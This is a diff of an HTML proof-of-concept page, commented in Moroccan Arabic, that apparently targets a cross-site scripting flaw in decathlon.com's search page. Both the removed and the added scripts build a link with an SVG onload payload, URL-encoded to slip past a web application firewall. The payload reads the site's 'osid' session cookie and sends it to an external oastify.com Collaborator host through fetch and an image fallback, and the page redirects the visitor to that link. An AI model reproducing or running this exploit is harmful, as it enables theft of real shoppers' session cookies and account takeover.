@@ -1,10 +1,32 @@
-<script>
-    // هادا هو "الساروت" اللي حل ليك الباب
-    let payload = "fetch('https://dvcvt1kmjcj31iisr8xraaf39ufl3mrb.oastify.com/?data='+btoa(document.cookie))";
-    
-    // التغليف اللي هرب من الحماية
-    let encoded = encodeURIComponent(payload);
-    let target = "https://www.decathlon.com/search?q=test#<svg/onload=eval(decodeURIComponent('" + encoded + "'))>";
+<!DOCTYPE html>
+<html>
+<body>
+    <script>
+        // هاد السكريبت هو اللي غيجيب ليك الـ OSID من قلب Decathlon
+        let payload = `
+            (function(){
+                // كنجبدو الـ OSID بوحدو باش يكون الدليل واضح فـ Burp
+                var osid = document.cookie.match(/osid=([^;]+)/)?.[1] || "OSID_NOT_FOUND";
+                
+                // الرابط ديال Burp اللي خدام ليك دابا
+                var targetUrl = "https://dvcvt1kmjcj31iisr8xraaf39ufl3mrb.oastify.com/?osid=" + osid;
+                
+                // كنستعملو fetch بحال المرة اللي نجحات
+                fetch(targetUrl, {mode: 'no-cors'});
+                
+                // كنضيفو Image للتأكيد إلا تبلوكا الـ fetch
+                var img = new Image();
+                img.src = targetUrl + "&fallback=image";
+            })();
+        `;
 
-    window.location.href = target;
-</script>
+        // كنشفروا الكود كامل باش نهربو من الـ WAF
+        let encoded = encodeURIComponent(payload);
+
+        // الرابط النهائي باستعمال الـ Hash (#)
+        let finalLink = "https://www.decathlon.com/search?q=test#<svg/onload=eval(decodeURIComponent('" + encoded + "'))>";
+
+        window.location.href = finalLink;
+    </script>
+</body>
+</html>
